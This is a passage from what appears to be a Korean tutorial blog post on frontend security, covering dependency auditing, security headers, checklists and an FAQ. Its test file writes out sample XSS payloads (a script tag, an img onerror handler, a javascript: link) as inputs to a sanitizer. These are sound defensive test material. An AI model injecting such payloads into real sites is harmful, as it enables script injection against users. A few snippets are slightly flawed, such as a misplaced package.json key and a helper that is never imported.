## 의존성 보안

### npm audit 사용하기

```bash
# 취약점 검사
npm audit

# 자동 수정 (major 버전 변경 없이)
npm audit fix

# major 버전도 함께 업데이트
npm audit fix --force

# 보고서 생성
npm audit --json > audit-report.json
```

### package.json에 보안 스크립트 추가

```json
{
  "scripts": {
    "security:audit": "npm audit --production",
    "security:update": "npm update",
    "security:check": "npm audit && npm outdated",
    "preinstall": "npx npm-force-resolutions"
  },
  "resolutions": {
    "vulnerable-package": "^3.0.0"
  }
}
```

### Dependabot 설정

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

    # 보안 업데이트는 즉시
    labels:
      - "dependencies"
      - "security"

    # 자동 머지 설정 (선택사항)
    allow:
      - dependency-type: "direct"
        update-type: "security"
```

### Supply Chain Attack 방어

```bash
# package-lock.json 무결성 검증
npm ci # npm install 대신 사용

# 패키지 무결성 검증
npm install --package-lock-only
npm audit signatures
```

```json
// package.json
{
  "scripts": {
    "postinstall": "npm run verify-dependencies"
  },
  "verify-dependencies": "npm ls --production"
}
```

**신뢰할 수 있는 패키지만 설치하기:**

```typescript
// scripts/check-dependencies.ts
import { execSync } from 'child_process';

const trustedPackages = [
  'react',
  'next',
  '@types/react',
  '@types/node',
  'typescript',
  // ... 신뢰할 수 있는 패키지 목록
];

const installedPackages = JSON.parse(
  execSync('npm ls --json --depth=0').toString()
);

const untrustedPackages = Object.keys(installedPackages.dependencies || {})
  .filter(pkg => !trustedPackages.includes(pkg));

if (untrustedPackages.length > 0) {
  console.error('Untrusted packages detected:');
  console.error(untrustedPackages);
  process.exit(1);
}
```

## 보안 헤더

### 주요 보안 헤더 설정

```typescript
// next.config.ts
import type { NextConfig } from 'next';

const securityHeaders = [
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'on'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload'
  },
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block'
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin'
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
  }
];

const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};

export default nextConfig;
```

### 보안 헤더 설명

```typescript
const securityHeadersExplanation = {
  'Strict-Transport-Security': {
    purpose: 'HTTPS만 사용하도록 강제',
    value: 'max-age=63072000; includeSubDomains; preload',
    description: '2년간 HTTPS만 허용, 서브도메인 포함, HSTS preload',
  },

  'X-Frame-Options': {
    purpose: 'Clickjacking 방지',
    value: 'SAMEORIGIN',
    description: '같은 도메인에서만 iframe 허용',
    alternatives: "DENY (모든 iframe 차단) | ALLOW-FROM uri (특정 uri만 허용, 비권장)"
  },

  'X-Content-Type-Options': {
    purpose: 'MIME 타입 스니핑 방지',
    value: 'nosniff',
    description: '선언된 Content-Type만 허용',
  },

  'X-XSS-Protection': {
    purpose: '브라우저 XSS 필터 활성화',
    value: '1; mode=block',
    description: 'XSS 감지 시 페이지 렌더링 차단',
    note: 'CSP가 더 강력하지만 이전 브라우저 지원용',
  },

  'Referrer-Policy': {
    purpose: 'Referer 헤더 제어',
    value: 'strict-origin-when-cross-origin',
    description: 'HTTPS→HTTP는 referer 전송 안 함',
  },

  'Permissions-Policy': {
    purpose: '브라우저 기능 접근 제어',
    value: 'camera=(), microphone=(), geolocation=()',
    description: '카메라, 마이크, 위치 접근 차단',
  },
};
```

## 실전 보안 체크리스트

### 개발 단계 체크리스트

```typescript
const developmentSecurityChecklist = {
  input: [
    '✅ 모든 사용자 입력 검증',
    '✅ 화이트리스트 방식 검증 (블랙리스트 X)',
    '✅ 입력 길이 제한',
    '✅ 특수문자 필터링/이스케이프',
  ],

  output: [
    '✅ React 기본 렌더링 사용 (자동 이스케이프)',
    '✅ dangerouslySetInnerHTML 최소화',
    '✅ HTML 렌더링 시 DOMPurify 사용',
    '✅ URL 출력 전 검증',
  ],

  authentication: [
    '✅ HttpOnly + Secure + SameSite 쿠키',
    '✅ JWT는 메모리 저장',
    '✅ Refresh Token 전략 구현',
    '✅ 비밀번호 해싱 (bcrypt, argon2)',
    '✅ Rate limiting 구현',
  ],

  api: [
    '✅ CORS 정책 올바르게 설정',
    '✅ CSRF 토큰 검증',
    '✅ API Rate limiting',
    '✅ 입력 크기 제한',
    '✅ 에러 메시지에 민감정보 미포함',
  ],

  dependencies: [
    '✅ npm audit 정기 실행',
    '✅ Dependabot 설정',
    '✅ package-lock.json 커밋',
    '✅ 신뢰할 수 있는 패키지만 사용',
  ],
};
```

### 배포 전 체크리스트

```typescript
const deploymentSecurityChecklist = {
  headers: [
    '✅ Content-Security-Policy 설정',
    '✅ Strict-Transport-Security',
    '✅ X-Frame-Options',
    '✅ X-Content-Type-Options',
    '✅ Referrer-Policy',
  ],

  environment: [
    '✅ 환경변수로 시크릿 관리',
    '✅ .env 파일 .gitignore',
    '✅ 프로덕션에서 디버그 모드 비활성화',
    '✅ 에러 스택 숨기기',
  ],

  https: [
    '✅ HTTPS 강제',
    '✅ TLS 1.2 이상',
    '✅ HSTS 설정',
    '✅ 유효한 SSL 인증서',
  ],

  monitoring: [
    '✅ CSP 위반 리포팅',
    '✅ 보안 로깅',
    '✅ 이상 활동 모니터링',
    '✅ 정기적인 보안 감사',
  ],
};
```

### 보안 테스트

```typescript
// tests/security.test.ts
import { render, screen } from '@testing-library/react';
import { sanitizeHtml } from '@/lib/sanitize';

describe('XSS 방어 테스트', () => {
  test('스크립트 태그가 제거되어야 함', () => {
    const dangerous = '<script>alert("XSS")</script>Hello';
    const clean = sanitizeHtml(dangerous);

    expect(clean).not.toContain('<script>');
    expect(clean).toContain('Hello');
  });

  test('onerror 이벤트가 제거되어야 함', () => {
    const dangerous = '<img src=x onerror="alert(\'XSS\')">';
    const clean = sanitizeHtml(dangerous);

    expect(clean).not.toContain('onerror');
  });

  test('javascript: 프로토콜이 제거되어야 함', () => {
    const dangerous = '<a href="javascript:alert(\'XSS\')">클릭</a>';
    const clean = sanitizeHtml(dangerous);

    expect(clean).not.toContain('javascript:');
  });
});

describe('CSRF 방어 테스트', () => {
  test('CSRF 토큰이 요청에 포함되어야 함', async () => {
    const mockFetch = jest.fn();
    global.fetch = mockFetch;

    await safeFetch('/api/transfer', {
      method: 'POST',
      body: JSON.stringify({ amount: 1000 }),
    });

    const headers = mockFetch.mock.calls[0][1].headers;
    expect(headers['X-CSRF-Token']).toBeDefined();
  });
});
```

## FAQ

### Q1: localStorage에 토큰을 저장하면 안 되나요?

**A:** XSS 공격에 매우 취약합니다. XSS가 발생하면 공격자가 `localStorage.getItem()`으로 토큰을 쉽게 탈취할 수 있습니다. HttpOnly 쿠키나 메모리 저장을 권장합니다.

```javascript
// ❌ 위험
localStorage.setItem('token', accessToken);

// ✅ 안전
// 1. HttpOnly 쿠키 (서버에서 설정)
// 2. 메모리 저장 (TokenStore 패턴)
```

### Q2: React는 기본적으로 XSS를 방어한다면서요. 그럼 신경 안 써도 되나요?

**A:** 아니요. `dangerouslySetInnerHTML`, `href`, `src` 등에 사용자 입력을 넣을 때는 여전히 위험합니다. 또한 서드파티 라이브러리나 innerHTML을 직접 사용하는 경우도 주의해야 합니다.

### Q3: CSP를 설정하면 Google Analytics 같은 외부 스크립트가 작동하지 않는데요?

**A:** CSP에서 해당 도메인을 명시적으로 허용해야 합니다:

```typescript
"script-src 'self' https://www.googletagmanager.com https://www.google-analytics.com"
```

### Q4: SameSite=Strict를 쓰면 외부 링크에서 로그인이 안 되는 것 같은데요?

**A:** 맞습니다. SameSite=Lax를 사용하면 GET 요청에는 쿠키가 포함되어 이 문제를 완화할 수 있습니다. 또는 별도의 인증 플로우를 구현하세요.

### Q5: CSRF 토큰과 SameSite 쿠키 중 뭘 써야 하나요?

**A:** 둘 다 사용하는 것이 가장 안전합니다. SameSite는 최신 브라우저에서만 지원되므로, CSRF 토큰으로 추가 방어층을 제공하는 것이 좋습니다.

### Q6: DOMPurify가 모든 XSS를 막아주나요?

**A:** 대부분의 XSS를 막아주지만, 100% 완벽하지는 않습니다. 입력 검증, 출력 인코딩, CSP 등 여러 방어 계층을 함께 사용해야 합니다.

### Q7: npm audit에서 나온 취약점을 모두 수정해야 하나요?

**A:** Critical과 High는 반드시 수정하세요. Medium과 Low는 프로젝트에 미치는 영향을 평가한 후 우선순위를 정하세요. 단, dev dependencies의 취약점은 프로덕션에 영향을 주지 않습니다.

### Q8: 비밀번호를 프론트엔드에서 해싱해야 하나요?

**A:** 아니요. HTTPS로 전송하면 충분합니다. 프론트엔드 해싱은 의미가 없고, 해싱은 서버에서 해야 합니다. 프론트엔드에서는 비밀번호 강도 검증 정도만 하세요.

## 마치며

프론트엔드 보안은 단순히 체크리스트를 따르는 것이 아닙니다. **공격자의 사고방식을 이해하고, 방어적으로 코드를 작성하는 습관**을 길러야 합니다.

**핵심 원칙:**

1. **사용자 입력을 절대 신뢰하지 않기** - 모든 입력은 잠재적 공격
2. **방어를 계층화하기** - 하나의 방어가 뚫려도 다른 방어층이 존재
3. **최소 권한 원칙** - 필요한 최소한의 권한만 부여
4. **안전한 기본값** - 보안이 강화된 상태가 기본
5. **지속적인 모니터링과 업데이트** - 보안은 한 번이 아닌 지속적인 과정

**실천 가이드:**

```typescript
// 매일
- npm audit 실행
- 코드 리뷰 시 보안 체크
- 의심스러운 활동 모니터링

// 매주
- 의존성 업데이트 확인
- 보안 뉴스/취약점 확인

// 매월
- 전체 보안 감사
- CSP 리포트 검토
- 접근 로그 분석

// 분기별
- 침투 테스트 (가능하다면)
- 보안 정책 업데이트
- 팀 보안 교육
```

보안은 어렵지만, 사용자를 보호하는 것은 개발자의 책임입니다. 이 가이드가 더 안전한 웹 애플리케이션을 만드는 데 도움이 되길 바랍니다.

> 완벽한 보안은 없지만, 충분히 안전한 시스템은 만들 수 있습니다.
{: .prompt-tip }

## 참고 자료

### 공식 가이드라인
- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

### React 및 프론트엔드 보안
- [React Security Best Practices](https://react.dev/reference/react-dom/components/common#security-considerations)
- [Next.js Security Headers](https://nextjs.org/docs/app/building-your-application/configuring/security-headers)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

### 라이브러리 및 도구
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [helmet.js](https://helmetjs.github.io/)
- [csurf (CSRF 미들웨어)](https://github.com/expressjs/csurf)
- [jsonwebtoken](https://github.com/auth0/node-jsonwebtoken)

### 보안 뉴스 및 블로그
- [Google Security Blog](https://security.googleblog.com/)
- [Mozilla Security Blog](https://blog.mozilla.org/security/)
- [Troy Hunt's Blog](https://www.troyhunt.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

### 보안 테스트
- [OWASP ZAP](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit)
- [Snyk](https://snyk.io/)

### 한국어 자료
- [한국인터넷진흥원 (KISA) 보안 가이드](https://www.kisa.or.kr/)
- [보안뉴스](https://www.boannews.com/)
- [OWASP 한국 챕터](https://owasp.org/www-chapter-korea/)
